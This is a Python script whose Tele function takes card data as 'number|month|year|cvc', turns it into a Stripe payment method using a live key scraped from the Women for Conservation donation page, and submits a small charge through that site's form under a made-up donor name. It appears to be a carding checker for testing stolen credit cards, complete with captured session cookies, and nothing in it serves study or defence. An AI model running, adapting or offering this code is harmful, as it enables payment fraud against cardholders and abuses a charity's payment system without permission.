import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fe9b153e2b2%3B+stripe-js-v3%2Fe9b153e2b2%3B+card-element&referrer=https%3A%2F%2Fwfc.frclab.com&time_on_page=35762&key=pk_live_0ssuuGVx1XpDr4BLpavlETM000NqVFG8Jt'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_gcl_au': '1.1.384640925.1744449051',
	    '_ga': 'GA1.1.1085755529.1744449051',
	    '_hjSessionUser_3497835': 'eyJpZCI6IjA4MWI3OGQ4LWYzOTUtNWJmNS04MGNkLTAxZjQ3MGNmNjRkNSIsImNyZWF0ZWQiOjE3NDQ0NDkwNTA5MjEsImV4aXN0aW5nIjp0cnVlfQ==',
	    '__stripe_mid': 'd04d4ecd-e762-4ffa-968b-d14cfed8f4d09db45e',
	    '_ga_CDD0PCVREP': 'GS1.1.1745246586.3.0.1745246586.0.0.0',
	    '_hjSession_3497835': 'eyJpZCI6IjI3ZmM3MWRkLTMwZDktNDRiOS1iN2UzLWRiNDg4ZjQxZTk5NCIsImMiOjE3NDUyNDY1ODcwMjUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
	    '__stripe_sid': '3b92694a-5aaf-458f-89d4-c9ceb618dd06464a42',
	}
	
	headers = {
	    'authority': 'wfc.frclab.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gcl_au=1.1.384640925.1744449051; _ga=GA1.1.1085755529.1744449051; _hjSessionUser_3497835=eyJpZCI6IjA4MWI3OGQ4LWYzOTUtNWJmNS04MGNkLTAxZjQ3MGNmNjRkNSIsImNyZWF0ZWQiOjE3NDQ0NDkwNTA5MjEsImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=d04d4ecd-e762-4ffa-968b-d14cfed8f4d09db45e; _ga_CDD0PCVREP=GS1.1.1745246586.3.0.1745246586.0.0.0; _hjSession_3497835=eyJpZCI6IjI3ZmM3MWRkLTMwZDktNDRiOS1iN2UzLWRiNDg4ZjQxZTk5NCIsImMiOjE3NDUyNDY1ODcwMjUsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; __stripe_sid=3b92694a-5aaf-458f-89d4-c9ceb618dd06464a42',
	    'origin': 'https://wfc.frclab.com',
	    'referer': 'https://wfc.frclab.com/donate-now/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = "action=wpf_submit_form&form_id=9982&payment_total=100&form_data=__wpf_form_id%3D9982%26__wpf_current_url%3Dhttps%253A%252F%252Fwfc.frclab.com%252Fdonate-now%26__wpf_current_page_id%3D6691%26donation_item_custom%3D1%26donation_item%3Dcustom%26donation_recurring_interval%3Dmonth%26customer_name%3DRodam%2520User%26customer_email%3Drodamuser08%2540gmail.com%26select%3DScholarships%2520for%2520girl's%2520education%26__wpf_valid_payment_methods_count%3D2%26__wpf_selected_payment_method%3Dstripe%26__paypal_payment_gateway%3Dpaypal%26__stripe_payment_method_id%3D"+str(pm)+"&tax_total=0&main_total=100&form_localize%5Bform_id%5D=9982&form_localize%5Bcheckout_description%5D=Donation+template+(horizontal)+(%239982)&form_localize%5Bcurrency_settings%5D%5Bcurrency%5D=USD&form_localize%5Bcurrency_settings%5D%5Blocale%5D=auto&form_localize%5Bcurrency_settings%5D%5Bcurrency_sign_position%5D=left&form_localize%5Bcurrency_settings%5D%5Bcurrency_separator%5D=dot_comma&form_localize%5Bcurrency_settings%5D%5Bdecimal_points%5D=0&form_localize%5Bcurrency_settings%5D%5Bsettings_type%5D=global&form_localize%5Bcurrency_settings%5D%5Bcurrency_conversion_api_key%5D=&form_localize%5Bcurrency_settings%5D%5Bcurrency_rate_caching_interval%5D=&form_localize%5Bcurrency_settings%5D%5Bis_zero_decimal%5D=false&form_localize%5Bcurrency_settings%5D%5Bcurrency_sign%5D=%24&form_localize%5Bstripe_checkout_title%5D=Women+for+Conservation&form_localize%5Bstripe_checkout_logo%5D=&form_localize%5Bstripe_pub_key%5D=pk_live_0ssuuGVx1XpDr4BLpavlETM000NqVFG8Jt&form_localize%5Bstripe_checkout_style%5D=embedded_form&form_localize%5Bstripe_verify_zip%5D=no&form_localize%5Bstripe_billing_info%5D=no&form_localize%5Bstripe_shipping_info%5D=&form_localize%5Bstripe_element_id%5D=wpf_input_9982_stripe_card_element&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Bvalue%5D="
	
	r2 = requests.post('https://wfc.frclab.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
